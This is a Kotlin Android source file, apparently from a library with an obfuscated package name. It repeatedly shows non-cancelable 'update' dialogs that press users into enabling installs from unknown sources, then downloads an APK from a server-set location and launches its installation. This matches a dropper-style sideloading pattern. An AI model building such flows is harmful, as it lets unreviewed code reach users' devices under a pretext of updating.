package com.xxxxxxh.lib.utils

import android.annotation.SuppressLint
import android.app.Activity
import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Message
import android.provider.Settings
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.core.content.FileProvider
import com.awesomedialog.blennersilva.awesomedialoglibrary.AwesomeProgressDialog
import com.github.javiersantos.bottomdialogs.BottomDialog
import com.xxxxxxh.lib.R
import com.xxxxxxh.lib.entity.ResultEntity
import java.io.File

@RequiresApi(Build.VERSION_CODES.O)
@SuppressLint("StaticFieldLeak")
class DialogManager : CustomDownloadListener {
    private var isInstall = false
    private var context: Context? = null
    private var downloadDlg: AwesomeProgressDialog? = null

    companion object {

        private var i: DialogManager? = null
            get() {
                field ?: run {
                    field = DialogManager()
                }
                return field
            }

        @Synchronized
        fun get(): DialogManager {
            return i!!
        }
    }

    private val handler: Handler = @SuppressLint("HandlerLeak")
    object : Handler() {

        override fun handleMessage(msg: Message) {
            super.handleMessage(msg)
            if (msg.what == 1) {
                if (!isBackground(context!!)) {
                    if (!isInstall) {
                        if (context!!.packageManager.canRequestPackageInstalls()) {
                            isInstall = true
                            sendEmptyMessage(1)
                        } else {
                            if (!isBackground(context!!)) {
                                showPermissionDialog(context!!)
                            } else {
                                sendEmptyMessageDelayed(1, 1500)
                            }
                        }
                    } else {
                        showUpdateDialog(context!!, Constant.entity!!.ikey, Constant.entity!!)
                    }
                } else {
                    sendEmptyMessageDelayed(1, 1500)
                }
            }
        }
    }

    fun showPermissionDialog(context: Context) {
        this.context = context
        BottomDialog.Builder(context)
            .setTitle("Permissions")
            .setContent("App need updated,please turn on allow from this source tes")
            .setCancelable(false)
            .setPositiveText("OK")
            .setPositiveBackgroundColorResource(R.color.colorPrimary)
            .setPositiveTextColorResource(android.R.color.white)
            .onPositive {
                isInstall = context.packageManager.canRequestPackageInstalls()
                handler.sendEmptyMessageDelayed(1, 1000)
                if (!context.packageManager.canRequestPackageInstalls()) {
                    allowThirdInstall(context)
                } else {
                    showUpdateDialog(context, Constant.entity!!.ikey, Constant.entity!!)
                }
            }.show()
    }


    private fun allowThirdInstall(context: Context) {
        if (Build.VERSION.SDK_INT > 24) {
            if (!context.packageManager.canRequestPackageInstalls()) {
                val uri = Uri.parse("package:" + context.packageName)
                val i = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, uri)
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                (context as Activity).startActivity(i)
            }
        }
    }

    fun showUpdateDialog(context: Context, msg: String, entity: ResultEntity) {
        this.context = context
        BottomDialog.Builder(context)
            .setTitle("Update new version")
            .setContent(msg)
            .setCancelable(false)
            .setPositiveText("UPDATE")
            .setPositiveBackgroundColorResource(R.color.colorPrimary)
            .setPositiveTextColorResource(android.R.color.white)
            .onPositive {
                downloadDlg = downloadDialog(context)
                downloadDlg!!.show()
                Download.get().download(context, Constant.temp, this)
            }.show()
    }

    private fun downloadDialog(context: Context): AwesomeProgressDialog {
        return AwesomeProgressDialog(context)
            .setTitle("Downloading")
            .setCancelable(false)
    }

    fun isBackground(context: Context): Boolean {
        val activityManager = context
            .getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        val appProcesses = activityManager
            .runningAppProcesses
        for (appProcess in appProcesses) {
            if (appProcess.processName == context.packageName) {
                return appProcess.importance != ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND
            }
        }
        return false
    }

    override fun progress(progress: Int) {
        (context as Activity).runOnUiThread {
            downloadDlg!!.setMessage("current progress : $progress %")
        }

    }

    override fun downloadDone(filePath: String) {
        downloadDlg!!.hide()
        install(context!!, filePath, 0)
    }

    override fun downloadError(e: String) {
        downloadDlg!!.hide()
    }

    private fun install(context: Context, path: String, req: Int) {
        val file = File(path)
        if (!file.exists()) {
            return
        }
        var uri: Uri? = null
        uri = if (Build.VERSION.SDK_INT >= 24) {
            FileProvider.getUriForFile(
                context, context.packageName.toString() + ".fileprovider",
                file
            )
        } else {
            Uri.fromFile(file)
        }
        if (Build.VERSION.SDK_INT >= 26) {
            if (!context.packageManager.canRequestPackageInstalls()){
                Toast.makeText(context,"No Permission",Toast.LENGTH_SHORT).show()
                return
            }
        }
        val intent = Intent("android.intent.action.VIEW")
        intent.flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
        if (Build.VERSION.SDK_INT >= 24) {
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        intent.setDataAndType(uri, "application/vnd.android.package-archive")
        context.startActivity(intent)
    }
}